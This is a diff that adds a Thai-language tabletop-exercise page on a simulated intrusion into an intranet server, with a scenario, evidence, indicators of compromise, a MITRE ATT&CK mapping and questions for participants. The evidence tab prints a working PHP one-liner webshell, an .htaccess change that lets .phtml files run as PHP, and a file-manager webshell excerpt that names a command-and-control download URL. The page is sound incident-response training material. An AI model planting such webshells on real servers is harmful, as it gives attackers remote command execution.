@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inject 1: Reconnaissance — TTX User Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Thai:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg-card: #111827;
+  --bg-card-hover: #1a2332;
+  --bg-sidebar: #0d1321;
+  --border: #1e293b;
+  --border-accent: #2563eb;
+  --text: #e2e8f0;
+  --text-muted: #94a3b8;
+  --text-dim: #64748b;
+  --accent: #3b82f6;
+  --accent-hover: #60a5fa;
+  --green: #22c55e;
+  --green-bg: rgba(34,197,94,0.1);
+  --orange: #f59e0b;
+  --orange-bg: rgba(245,158,11,0.1);
+  --red: #ef4444;
+  --red-bg: rgba(239,68,68,0.1);
+  --blue: #06b6d4;
+  --blue-bg: rgba(6,182,212,0.1);
+  --purple: #a855f7;
+  --purple-bg: rgba(168,85,247,0.1);
+  --radius: 16px;
+  --radius-sm: 10px;
+  --shadow: 0 8px 32px rgba(0,0,0,0.25);
+  --transition: 0.2s ease;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'IBM Plex Sans Thai', 'Sarabun', 'Inter', sans-serif;
+  font-size: 17px;
+  line-height: 1.75;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+}
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+/* ===== Top Navigation ===== */
+.topnav {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(13,19,33,0.92);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid var(--border);
+}
+.topnav-inner {
+  max-width: 1120px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 20px;
+  overflow-x: auto;
+  white-space: nowrap;
+}
+.topnav-brand {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 0.5px;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+.topnav-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 14px;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text-muted);
+  transition: all var(--transition);
+  flex-shrink: 0;
+}
+.topnav-link:hover { color: var(--text); background: rgba(59,130,246,0.08); }
+.topnav-link.active { color: var(--accent); background: rgba(59,130,246,0.12); }
+.topnav-sep { width: 1px; height: 22px; background: var(--border); margin: 0 6px; flex-shrink: 0; }
+
+/* ===== Main ===== */
+.main {
+  max-width: 1120px;
+  margin: 0 auto;
+  padding: 32px 20px 60px;
+}
+
+/* ===== Inject Header ===== */
+.inject-header {
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  border: 1px solid var(--border);
+}
+.inject-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 4px; line-height: 1.4; }
+.inject-header .meta { display: flex; gap: 16px; margin-top: 8px; flex-wrap: wrap; }
+.inject-header .meta span { font-size: 14px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; }
+
+/* ===== Tabs ===== */
+.tabs {
+  display: flex;
+  gap: 4px;
+  margin-bottom: 20px;
+  overflow-x: auto;
+  padding-bottom: 4px;
+  border-bottom: 1px solid var(--border);
+}
+.tab-btn {
+  padding: 10px 20px;
+  border: none;
+  border-radius: 8px;
+  background: transparent;
+  color: var(--text-muted);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  font-family: inherit;
+  border-bottom: 2px solid transparent;
+}
+.tab-btn:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.tab-btn.active { color: white; background: var(--accent); border-bottom-color: var(--accent); }
+.tab-content { display: none; animation: fadeIn 0.2s ease; }
+.tab-content.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ===== Cards ===== */
+.card {
+  background: linear-gradient(135deg, rgba(17,24,39,0.95), rgba(15,23,42,0.98));
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+  transition: all 0.3s ease;
+}
+.card:hover {
+  border-color: rgba(59,130,246,0.3);
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px rgba(0,0,0,0.35);
+}
+.card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
+.card-icon {
+  width: 40px; height: 40px;
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  flex-shrink: 0;
+}
+.card-title { font-size: 20px; font-weight: 600; color: var(--text); }
+.card-subtitle { font-size: 14px; color: var(--text-dim); }
+
+/* ===== Tables ===== */
+table { width: 100%; border-collapse: separate; border-spacing: 0; margin: 12px 0; }
+th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 15px; }
+th { font-weight: 600; color: var(--text); background: rgba(59,130,246,0.15); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+td { color: var(--text-muted); }
+tbody tr { transition: background var(--transition); }
+tbody tr:hover { background: rgba(255,255,255,0.03); }
+
+/* ===== Evidence ===== */
+.evidence-block {
+  background: rgba(0,0,0,0.3);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  margin: 12px 0;
+  overflow: hidden;
+}
+.evidence-title {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  cursor: pointer;
+  transition: background var(--transition);
+  font-size: 15px;
+  font-weight: 500;
+  color: var(--text-muted);
+}
+.evidence-title:hover { background: rgba(255,255,255,0.03); }
+.evidence-title .arrow { transition: transform 0.2s ease; font-size: 12px; }
+.evidence-title.open .arrow { transform: rotate(90deg); }
+.evidence-title-inner { display: flex; align-items: center; flex: 1; min-width: 0; gap: 8px; flex-wrap: wrap; }
+.evidence-dl {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 10px;
+  background: rgba(34,197,94,0.1);
+  border: 1px solid rgba(34,197,94,0.3);
+  border-radius: 6px;
+  color: var(--green);
+  font-size: 12px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  margin-left: 8px;
+  flex-shrink: 0;
+}
+.evidence-dl:hover { background: rgba(34,197,94,0.2); border-color: var(--green); transform: translateY(-1px); }
+.evidence-dl:active { transform: translateY(0); }
+.evidence-body { display: none; padding: 0 18px 18px; }
+.evidence-body.open { display: block; }
+pre {
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 16px;
+  overflow-x: auto;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #c9d1d9;
+  margin: 8px 0;
+}
+
+/* ===== IoC ===== */
+.ioc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 12px;
+  margin: 12px 0;
+}
+.ioc-item {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+}
+.ioc-label {
+  font-size: 13px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+.ioc-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 15px;
+  color: var(--orange);
+  word-break: break-all;
+}
+
+/* ===== Questions ===== */
+.question-card {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid rgba(59,130,246,0.15);
+  border-left: 4px solid var(--accent);
+  border-radius: 12px;
+  padding: 20px 24px;
+  margin: 10px 0;
+}
+.question-num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  font-size: 14px;
+  font-weight: 700;
+  color: white;
+  background: var(--accent);
+  border-radius: 50%;
+  margin-bottom: 8px;
+}
+.question-text { font-size: 17px; color: var(--text); line-height: 1.7; }
+
+/* ===== MITRE ===== */
+.mitre-tags { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+.mitre-tag {
+  display: inline-block;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* ===== Badges ===== */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+}
+.badge-green { background: var(--green-bg); color: var(--green); }
+.badge-orange { background: var(--orange-bg); color: var(--orange); }
+.badge-red { background: var(--red-bg); color: var(--red); }
+.badge-blue { background: var(--blue-bg); color: var(--blue); }
+.badge-purple { background: var(--purple-bg); color: var(--purple); }
+
+/* ===== Nav Arrows ===== */
+.nav-arrows { display: flex; justify-content: space-between; margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border); }
+.nav-arrow-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 24px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  background: var(--bg-card);
+  color: var(--text-muted);
+  font-size: 14px;
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: inherit;
+  text-decoration: none;
+}
+.nav-arrow-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+.nav-arrow-btn.next { margin-left: auto; }
+
+/* ===== Utility ===== */
+.highlight { color: var(--accent); font-weight: 600; }
+.highlight-green { color: var(--green); font-weight: 600; }
+.highlight-orange { color: var(--orange); font-weight: 600; }
+.highlight-red { color: var(--red); font-weight: 600; }
+.highlight-blue { color: var(--blue); font-weight: 600; }
+.highlight-purple { color: var(--purple); font-weight: 600; }
+.text-muted { color: var(--text-muted); }
+.text-dim { color: var(--text-dim); }
+
+.footer {
+  border-top: 1px solid var(--border);
+  padding: 24px;
+  text-align: center;
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+@media (max-width: 768px) {
+  .main { padding: 20px 14px 40px; }
+  .inject-header { padding: 20px; }
+  .inject-header h2 { font-size: 18px; }
+  .card { padding: 20px; }
+  .card-title { font-size: 18px; }
+  .ioc-grid { grid-template-columns: 1fr; }
+  .nav-arrows { flex-direction: column; gap: 10px; }
+  .nav-arrow-btn { justify-content: center; }
+  .nav-arrow-btn.next { margin-left: 0; }
+}
+</style>
+</head>
+<body>
+<nav class="topnav">
+  <div class="topnav-inner">
+    <span class="topnav-brand">TTX · Phantom Tide</span>
+    <a class="topnav-link" href="../index.html">&#127968; หน้าหลัก</a>
+    <span class="topnav-sep"></span>
+    <a class="topnav-link active" href="index.html">Inject 1</a>
+    <a class="topnav-link" href="../Inject2/index.html">Inject 2</a>
+    <a class="topnav-link" href="../Inject3/index.html">Inject 3</a>
+    <a class="topnav-link" href="../Inject4/index.html">Inject 4</a>
+  </div>
+</nav>
+
+<main class="main">
+  <!-- ===== Inject Header ===== -->
+  <div class="inject-header" style="background:linear-gradient(135deg,rgba(34,197,94,0.08),rgba(34,197,94,0.02));border-color:rgba(34,197,94,0.3)">
+    <h2><span class="badge badge-green">&#9679; GREEN</span>&nbsp; Inject 1: Reconnaissance — การสำรวจและสแกนเครือข่าย</h2>
+    <div class="meta">
+      <span>&#128337; 09:30 - 10:30 (60 นาที)</span>
+      <span>&#127919; Phase: Initial Access / Persistence</span>
+      <span>&#128200; ระดับ: สัญญาณอันตราย</span>
+    </div>
+  </div>
+
+  <!-- ===== Tabs ===== -->
+  <div class="tabs" id="tabs-inj1">
+    <button class="tab-btn active" onclick="switchTab('inj1','scenario')">&#128196; สถานการณ์</button>
+    <button class="tab-btn" onclick="switchTab('inj1','evidence')">&#128269; หลักฐาน</button>
+    <button class="tab-btn" onclick="switchTab('inj1','ioc')">&#9888; IoC</button>
+    <button class="tab-btn" onclick="switchTab('inj1','questions')">&#10067; คำถาม</button>
+  </div>
+
+  <!-- ===== Tab: Scenario ===== -->
+  <div class="tab-content active" id="inj1-tab-scenario">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127908; สถานการณ์</h3>
+      <div style="background:rgba(34,197,94,0.05);border:1px solid rgba(34,197,94,0.2);border-radius:var(--radius-sm);padding:16px;margin:12px 0">
+        <p style="color:var(--text);line-height:1.8">
+          &#8220;เวลา 12:28 น. (12 กรกฎาคม 2569) เซิร์ฟเวอร์ Intranet (<span class="highlight-orange">192.168.2.35</span>) มีไฟล์ PHP ใหม่ถูกสร้างขึ้นใน directory ที่ไม่คาดคิด:
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px;font-family:'JetBrains Mono',monospace;font-size:13px;background:rgba(0,0,0,0.3);padding:12px;border-radius:6px">
+          <strong style="color:var(--red)">ไฟล์:</strong> news_th-15072018-091512-628401.php<br>
+          <strong style="color:var(--red)">ขนาด:</strong> 61,096 bytes (61KB)<br>
+          <strong style="color:var(--red)">ตำแหน่ง:</strong> /phocadownload/AdminMoveFromDWR/archive/2018/03/<br>
+          <strong style="color:var(--red)">ลักษณะ:</strong> ปลอมตัวเป็นไฟล์ archive จากปี 2018
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ไฟล์นี้มี code ที่:
+        </p>
+        <ul style="color:var(--text);line-height:1.8;margin-top:4px;padding-left:20px">
+          <li>ตรวจสอบ password <span class="highlight-red">dada9527</span> จาก GET parameter</li>
+          <li>executes arbitrary commands ผ่าน <code style="color:var(--red)">system()</code> / <code style="color:var(--red)">shell_exec()</code></li>
+          <li>ตั้ง HTTP response code เป็น <span class="highlight-red">404</span> เพื่ออำพราง</li>
+        </ul>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ในเวลาเดียวกัน มี webshell อีก 3 ไฟล์ถูกสร้างขึ้น:
+          <span class="highlight" style="font-family:'JetBrains Mono',monospace">news_fetch_628404.php</span>,
+          <span class="highlight" style="font-family:'JetBrains Mono',monospace">lanprobe628405.php</span>,
+          <span class="highlight" style="font-family:'JetBrains Mono',monospace">lanprobe628406.php</span>
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          &#8220;ในขณะนี้ คุณจะดำเนินการอย่างไร?&#8221;
+        </p>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127919; MITRE ATT&amp;CK</h3>
+      <div class="mitre-tags">
+        <span class="mitre-tag" style="background:rgba(34,197,94,0.1);color:var(--green)">T1190 - Exploit Public-Facing Application</span>
+        <span class="mitre-tag" style="background:rgba(34,197,94,0.1);color:var(--green)">T1505.003 - Web Shell</span>
+        <span class="mitre-tag" style="background:rgba(245,158,11,0.1);color:var(--orange)">T1036.005 - Masquerading</span>
+        <span class="mitre-tag" style="background:rgba(245,158,11,0.1);color:var(--orange)">T1070.006 - Timestomp</span>
+        <span class="mitre-tag" style="background:rgba(245,158,11,0.1);color:var(--orange)">T1059.007 - PHP</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Evidence ===== -->
+  <div class="tab-content" id="inj1-tab-evidence">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน A-1: Web Shell Source Code (go4_bg.phtml)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; go4_bg.phtml</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>&lt;?php
+// Password-protected one-liner webshell
+// Found at: 192.168.2.19 (Wetland Survey)
+// .htaccess modified to execute .phtml as PHP
+
+if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
+    http_response_code(404);
+    system($_GET['c']);
+}
+?&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน A-2: .htaccess Modification</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; .htaccess (192.168.2.19)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># File: .htaccess found on 192.168.2.19 (Wetland Survey)
+# Modified by attacker to make .phtml execute as PHP
+
+AddType application/x-httpd-php .phtml</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน A-3: File Manager Webshell (fm661.php)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; fm661.php (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>// File: fm661.php — Full File Manager Webshell (1,481 lines)
+// Found at: 192.168.2.18 (Division — Windows / XAMPP)
+// Connects to C2: 47.76.38.146:8081
+
+define('ACCESS_PASSWORD', 'dada9527');
+define('SHELL_DL_BASE', 'http://47.76.38.146:8081/file/download/');
+
+session_start();
+
+// Password check
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if (isset($_POST['password']) &amp;&amp; $_POST['password'] === ACCESS_PASSWORD) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        exit; // show login form
+    }
+}
+
+// File Manager operations
+$action = $_GET['action'] ?? '';
+switch($action) {
+    case 'download': // Download files
+    case 'upload':   // Upload files
+    case 'delete':   // Delete files
+    case 'rename':   // Rename files
+    case 'mkdir':    // Create directory
+    case 'list':     // List files
+}</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน A-4: System Evidence (intraEvidence.txt)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; intraEvidence.txt</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># Evidence from 192.168.2.35 (Intranet — CentOS 7)
+# Collected: 12 July 2569
+
+=== ACTIVE CONNECTIONS ===
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 192.168.2.35:49901      47.76.38.146:8081      ESTABLISHED
+
+=== FILE LISTING (phocadownload) ===
+-rw-r--r-- 1 root root 61096 Jul 12 12:28 news_th-15072018-091512-628401.php
+-rw-r--r-- 1 root root   438 Jul 12 12:38 news_fetch_628404.php
+-rw-r--r-- 1 root root  1103 Jul 12 13:10 lanprobe628405.php
+-rw-r--r-- 1 root root  1721 Jul 12 13:13 lanprobe628406.php
+-rw-r--r-- 1 root root  1089 Jul 12 13:19 sqlx628407.php</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: IoC ===== -->
+  <div class="tab-content" id="inj1-tab-ioc">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#9888; Indicators of Compromise (IoC)</h3>
+      <div class="ioc-grid">
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Webshell Password</div>
+          <div class="ioc-value">dada9527</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">C2 Server</div>
+          <div class="ioc-value">47.76.38.146:8081 (Alibaba Cloud)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">Target Server</div>
+          <div class="ioc-value">192.168.2.35 (Intranet — CentOS/Nginx)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">.htaccess Modification</div>
+          <div class="ioc-value">AddType application/x-httpd-php .phtml</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">Webshell Filenames</div>
+          <div class="ioc-value">news_th-15072018-*.php, go4_bg.phtml, fm661.php</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">C2 Download URL</div>
+          <div class="ioc-value">http://47.76.38.146:8081/file/download/</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--text-dim)">Webshell Size</div>
+          <div class="ioc-value">61,096 bytes (main), 438 bytes (fetcher)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--text-dim)">Attack Window</div>
+          <div class="ioc-value">12 Jul 2569, 12:28 - 13:19 (51 min)</div>
+        </div>
+      </div>
+      <div style="margin-top:16px">
+        <p style="font-size:13px;color:var(--text-dim);margin-bottom:8px">MITRE ATT&amp;CK Mapping:</p>
+        <table>
+          <thead><tr><th>Tactic</th><th>Technique</th><th>ID</th></tr></thead>
+          <tbody>
+            <tr><td>Initial Access</td><td>Exploit Public-Facing Application</td><td style="font-family:'JetBrains Mono',monospace">T1190</td></tr>
+            <tr><td>Persistence</td><td>Web Shell</td><td style="font-family:'JetBrains Mono',monospace">T1505.003</td></tr>
+            <tr><td>Defense Evasion</td><td>Masquerading: Match Legitimate Name</td><td style="font-family:'JetBrains Mono',monospace">T1036.005</td></tr>
+            <tr><td>Defense Evasion</td><td>Timestomp</td><td style="font-family:'JetBrains Mono',monospace">T1070.006</td></tr>
+            <tr><td>Execution</td><td>PHP</td><td style="font-family:'JetBrains Mono',monospace">T1059.007</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Questions ===== -->
+  <div class="tab-content" id="inj1-tab-questions">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#10067; คำถามสำหรับผู้เข้าร่วม</h3>
+      <div class="question-card">
+        <div class="question-num">Q1</div>
+        <div class="question-text">จาก IDS/IPS alerts จะระบุได้อย่างไรว่า Port Scanning นี้มาจากผู้โจมตีและไม่ใช่ admin ปกติที่กำลังทำงานอยู่?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q2</div>
+        <div class="question-text">สถานการณ์นี้ควรจัดเป็นระดับภัยคุกคามระดับใด? ควรตัดสินใจอะไรในฐานะผู้บริหารด้านความปลอดภัย?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q3</div>
+        <div class="question-text">ไฟล์ news_th-15072018-091512-628401.php ขนาด 61KB ที่พบในโฟลเดอร์ archive จะวิเคราะห์อย่างไร?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q4</div>
+        <div class="question-text">ถ้าเหตุการณ์นี้รั่วไหลไปสื่อมวลชน ควรเตรียมข้อความอย่างไร?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q5</div>
+        <div class="question-text">ต้องแจ้ง สกมช. หรือไม่ ณ จุดนี้? ยังไม่มี data breach ชัดเจน แต่มีสัญญาณโจมตี</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Nav Arrows ===== -->
+  <div class="nav-arrows">
+    <a class="nav-arrow-btn" href="../index.html">&#8592; หน้าหลัก</a>
+    <a class="nav-arrow-btn next" href="../Inject2/index.html">Inject 2: WebShell + Credential Exfil &#8594;</a>
+  </div>
+</main>
+
+<footer class="footer">
+  Inject 1: Reconnaissance — Operation Phantom Tide: Water Under Siege
+</footer>
+
+<script>
+// ========== Tabs ==========
+function switchTab(injectId, tabName) {
+  const tabsContainer = document.getElementById('tabs-' + injectId);
+  if (!tabsContainer) return;
+  const btns = tabsContainer.querySelectorAll('.tab-btn');
+  btns.forEach(b => b.classList.remove('active'));
+  const targetBtn = Array.from(btns).find(b => {
+    const onclick = b.getAttribute('onclick');
+    return onclick && onclick.includes(tabName);
+  });
+  if (targetBtn) targetBtn.classList.add('active');
+  const mainEl = tabsContainer.closest('.main');
+  if (!mainEl) return;
+  const contents = mainEl.querySelectorAll('.tab-content');
+  contents.forEach(c => c.classList.remove('active'));
+  const targetId = injectId + '-tab-' + tabName;
+  const target = document.getElementById(targetId);
+  if (target) target.classList.add('active');
+}
+
+// ========== Evidence Toggle ==========
+function toggleEvidence(element) {
+  element.classList.toggle('open');
+  const body = element.nextElementSibling;
+  if (body) body.classList.toggle('open');
+}
+
+// ========== Evidence Download ==========
+function downloadEvidence(btn, e) {
+  e.stopPropagation();
+  const title = btn.closest('.evidence-title');
+  const block = title.closest('.evidence-block');
+  const body = block.querySelector('.evidence-body pre');
+  if (!body) return;
+  const filenameSpan = title.querySelector('.evidence-title-inner span') || title.querySelector('span');
+  let filename = filenameSpan ? filenameSpan.textContent.replace(/^[\u{1F4C4}\u{1F4CB}\u{1F4DD}]\s*/u, '').trim() : 'evidence.txt';
+  if (!filename.match(/\.(txt|log|json|xml|csv|md|php|py|ps1|yml|yaml|sh|phtml|gif)$/i)) {
+    filename += '.txt';
+  }
+  const content = body.textContent;
+  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+// Add download buttons to all evidence blocks dynamically
+document.querySelectorAll('.evidence-title').forEach(title => {
+  const span = title.querySelector('span');
+  if (!span) return;
+  const dlBtn = document.createElement('button');
+  dlBtn.className = 'evidence-dl';
+  dlBtn.innerHTML = '&#11015; Download';
+  dlBtn.onclick = function(e) { downloadEvidence(this, e); };
+  title.insertBefore(dlBtn, title.querySelector('.arrow'));
+});
+</script>
+</body>
+</html>
